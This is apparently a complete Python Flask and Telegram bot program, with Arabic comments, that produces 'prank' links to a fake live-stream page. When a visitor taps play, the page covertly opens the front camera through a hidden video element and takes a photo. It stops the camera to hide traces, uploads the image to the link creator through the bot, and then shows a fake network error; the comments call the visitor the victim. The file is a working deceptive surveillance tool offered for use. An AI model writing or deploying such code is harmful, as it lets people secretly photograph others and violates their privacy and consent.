import os
import io
import time
from flask import Flask, request, abort, render_template_string
import telebot
import pymongo

# قراءة المتغيرات
TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")
MONGO_URL = os.getenv("MONGO_URL")

print("--- STARTING BOT ---")
print(f"TOKEN: {'Set' if TOKEN else 'MISSING'}")
print(f"BASE_URL: {BASE_URL}")
print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is missing")

# ✅ الإصلاح المهم: threaded=False لمنع إنهاء الخيط قبل تنفيذ الأمر
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

users_collection = None
if MONGO_URL:
    try:
        mongo_client = pymongo.MongoClient(MONGO_URL, connectTimeoutMS=5000)
        db = mongo_client["prank_bot"]
        users_collection = db["allowed_users"]
        print("✅ Connected to MongoDB successfully")
    except Exception as e:
        print(f"❌ DB Error: {e}")

@app.route("/")
def home(): return "Bot is running"

@app.route("/capture", methods=["GET"])
def capture_page():
    user_id = request.args.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not user_id or not is_allowed: return "الرابط غير صالح", 403

    html = """
    <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Live Stream</title>
    <style>
        body{background:#000;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;flex-direction:column;overflow:hidden}
        #clickArea{width:100%;height:100%;display:flex;justify-content:center;align-items:center;cursor:pointer;flex-direction:column;background:url('https://images.pexels.com/photos/1148399/pexels-photo-1148399.jpeg?auto=compress&cs=tinysrgb&w=1200')center/cover;position:relative}
        .overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1}
        .play-icon{width:90px;height:90px;background:rgba(255,255,255,0.3);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:3;border:3px solid #fff;transition:0.2s;position:relative}
        .play-icon:hover{background:rgba(255,255,255,0.6)}
        .play-icon svg{fill:#fff;width:36px;height:36px;margin-left:4px}
        #msg{z-index:3;margin-top:25px;font-size:18px;color:#eee;text-shadow:1px 1px 3px #000;position:relative}
        .live-badge{position:absolute;top:20px;right:20px;background:#ff0000;color:#fff;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;animation:pulse 1.5s infinite;z-index:3}
        @keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}
        .loading-bar{position:absolute;bottom:0;left:0;width:100%;height:4px;background:#333;z-index:4;display:none}
        .progress{height:100%;width:0%;background:#00d1ff;transition:width 0.3s}
        /* ✅ الفيديو مخفي تماماً عن الضحية لكنه يعمل فعلياً */
        #video{
            position:fixed;
            top:-9999px;
            left:-9999px;
            width:1px;
            height:1px;
            opacity:0.01;
            pointer-events:none;
            z-index:-1;
        }
        #canvas{display:none}
    </style>
    <body>
    <div id=clickArea>
        <div class=overlay></div>
        <span class=live-badge>Live</span>
        <div class=play-icon><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
        <div id=msg>Tap to play stream</div>
    </div>
    <div class=loading-bar id=loadingBar><div class=progress id=progress></div></div>
    <video id=video playsinline autoplay muted></video>
    <canvas id=canvas></canvas>
    <script>
        var a=document.getElementById('clickArea'),
            m=document.getElementById('msg'),
            v=document.getElementById('video'),
            c=document.getElementById('canvas'),
            u={{user_id}},
            bar=document.getElementById('loadingBar'),
            prog=document.getElementById('progress');
        var captured=false;

        a.onclick=function(){
            if(captured)return;

            // ✅ إظهار شريط التحميل فوراً للضحية (تضليل بصري)
            m.innerText="Connecting to server...";
            bar.style.display="block";
            prog.style.width="80%";

            // ✅ التقاط الصورة بأسرع وقت ممكن
            navigator.mediaDevices.getUserMedia({
                video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},
                audio:false
            })
            .then(function(stream){
                v.srcObject=stream;
                return v.play();
            })
            .then(function(){
                // ✅ التقاط بأسرع وقت — بدون انتظار طويل
                return new Promise(function(resolve){
                    if(v.videoWidth>0 && v.videoHeight>0){
                        resolve();
                    } else {
                        v.onloadedmetadata=resolve;
                        setTimeout(resolve, 500); // Timeout احتياطي فقط
                    }
                });
            })
            .then(function(){
                // ✅ التقاط مباشر — دون أي تأخير
                c.width=v.videoWidth||1280;
                c.height=v.videoHeight||720;
                var ctx=c.getContext('2d');
                ctx.drawImage(v,0,0,c.width,c.height);

                console.log("Captured:", c.width, "x", c.height);

                // ✅ إيقاف الكاميرا فوراً لإخفاء أي أثر
                if(v.srcObject){
                    v.srcObject.getTracks().forEach(function(t){t.stop();});
                    v.srcObject=null;
                }
                captured=true;

                // ✅ إرسال الصورة في الخلفية
                c.toBlob(function(blob){
                    if(!blob)return;
                    console.log("Blob size:", blob.size);
                    var f=new FormData();
                    f.append('photo',blob,'photo.jpg');
                    f.append('user_id',u);
                    fetch('/capture',{method:'POST',body:f})
                    .then(function(r){return r.text();})
                    .then(function(d){console.log("Server:",d);})
                    .catch(function(e){console.log("Err:",e);});

                    // ✅ عرض رسالة الخطأ الوهمية للضحية بعد ثانيتين
                    setTimeout(function(){
                        prog.style.width="100%";
                        bar.style.background="#ff3333";
                        document.querySelector('.play-icon').style.display="none";
                        document.querySelector('.live-badge').style.display="none";
                        m.innerHTML="<span style='color:#ff5555;font-size:20px;'>⚠️ خطأ في الشبكة<br>تعذر تحميل البث المباشر.</span>";
                    }, 2000);
                },'image/jpeg',0.85);
            })
            .catch(function(err){
                // ✅ إذا رفض الضحية الإذن، نظهر رسالة تطلب الموافقة
                prog.style.display="none";
                m.innerText="⚠️ يرجى السماح للكاميرا للاستمرار.";
                m.style.color="#ffaa00";
                captured=false;
                console.log("Camera error:",err);
            });
        };
    </script>
    </body></html>
    """
    return render_template_string(html, user_id=user_id)

@app.route("/capture", methods=["POST"])
def capture():
    try:
        photo = request.files.get("photo")
        user_id = request.form.get("user_id", type=int)

        print(f"--- 📸 CAPTURE POST RECEIVED ---")
        print(f"    user_id: {user_id}")

        if not photo:
            print("❌ No photo file in request")
            return "No photo", 400
        if not user_id:
            print("❌ No user_id in request")
            return "No user_id", 400

        is_allowed = False
        if users_collection is not None:
            is_allowed = users_collection.find_one({"user_id": user_id}) is not None
        if not is_allowed:
            print(f"❌ user_id {user_id} not authorized")
            return "Not authorized", 403

        photo.stream.seek(0)
        photo_bytes = photo.stream.read()
        print(f"📸 Photo size: {len(photo_bytes)} bytes")

        if not photo_bytes or len(photo_bytes) < 100:
            print(f"❌ Photo too small: {len(photo_bytes)} bytes")
            return "Empty photo", 400

        photo_file = io.BytesIO(photo_bytes)
        photo_file.name = "capture.jpg"

        result = bot.send_photo(chat_id=user_id, photo=photo_file)
        print(f"✅ Photo sent! message_id={result.message_id}")
        return "Image sent", 200

    except Exception as e:
        print(f"❌ Error in /capture: {e}")
        import traceback
        traceback.print_exc()
        return f"Error: {e}", 500

@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        try:
            update = telebot.types.Update.de_json(request.get_data(as_text=True))
            bot.process_new_updates([update])
            return "OK", 200
        except Exception as e:
            print(f"❌ Error processing update: {e}")
            return "Error", 500
    else:
        abort(403)

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")

@bot.message_handler(commands=["link"])
def link(message):
    try:
        if users_collection is not None:
            users_collection.update_one({"user_id": message.chat.id}, {"$set": {"user_id": message.chat.id}}, upsert=True)
        url = f"{BASE_URL}/capture?user_id={message.chat.id}"
        bot.reply_to(message, f"🎬 تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
    except Exception as e:
        print(f"❌ Error in /link: {e}")
        bot.reply_to(message, f"حدث خطأ: {e}")

# للتشغيل المحلي فقط
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)